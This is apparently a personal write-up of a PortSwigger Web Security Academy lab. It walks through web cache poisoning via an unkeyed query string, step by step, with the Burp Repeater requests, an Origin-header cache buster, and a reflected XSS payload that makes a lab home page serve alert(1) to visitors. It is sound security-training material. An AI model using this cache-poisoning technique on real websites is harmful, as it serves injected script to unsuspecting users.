
# #PortSwigger 


![[Pasted image 20260614125407.png]]


## Lab Description

> This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.
> 
> **Objective:** Poison the home page with a response that executes `alert(1)` in the victim's browser.

---

## Step 1: Understanding the Vulnerability

**Unkeyed query string:**
- The cache key does NOT include the query string parameters
- The response reflects query string values
- By poisoning the cache with a malicious query string, all users receive the XSS payload

**The attack chain:**
1. Attacker sends request with `?evil='/><script>alert(1)</script>`
2. Cache stores the poisoned response (query string not in cache key)
3. Victim requests home page (no query string)
4. Cache serves poisoned response → XSS executes

---

## Step 2: Reconnaissance

### Step 2.1: Load the Home Page

Load the lab's home page in your browser.

### Step 2.2: Find the Cache Oracle

In Burp Proxy -> **HTTP history**, find the `GET /` request.

Send it to **Repeater**.

![[Pasted image 20260614125747.png]]

### Step 2.3: Test Query String Unkeyed

Add arbitrary query parameters:
```
GET /?test=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

Keep sending. You'll get a cache hit even with different query strings.

Query string is **unkeyed**

---

## Step 3: Finding a Cache Buster

### Step 3.1: Use Origin Header as Cache Buster

Add the `Origin` header to force a cache miss:
```
GET /?test=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Origin: https://example.com
```

### Step 3.2: Verify Reflection

When you get a cache miss, your query parameters are reflected in the response.
![[Pasted image 20260614130118.png]]


---

## Step 4: Crafting the XSS Payload

### Step 4.1: Break Out of Reflection

The query parameter value is reflected somewhere in the response. Inject a payload that breaks out:
```
GET /?evil='/><script>alert(1)</script> HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Origin: https://example.com
```

![[Pasted image 20260614130327.png]]
### Step 4.2: Replay Until Cached

Keep sending until you see:
- Your payload in the response
- `X-Cache: hit`

![[Pasted image 20260614130313.png]]

---

## Step 5: Testing the Poisoned Response

### Step 5.1: Remove Query String

Send the request without the query string, but keep the cache buster:
```
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Origin: https://example.com
```

**Expected:** You still receive the poisoned response with your payload.

Poisoning works!

---

## Step 6: Poisoning the Real Cache

### Step 6.1: Remove Cache Buster

```
GET /?evil='/><script>alert(1)</script> HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### Step 6.2: Replay Until Cached

Keep sending until `X-Cache: hit`.

![[Pasted image 20260614130748.png]]
### Step 6.3: Verify in Browser

Load the home page (no query string, no Origin header):
```
https://YOUR-LAB-ID.web-security-academy.net/
```

**Expected:** `alert(1)` popup appears.

---

## Step 7: Lab Solved

The victim visits the home page, receives the poisoned cache, and executes `alert(1)`.

![[Pasted image 20260614130807.png]]

---
---
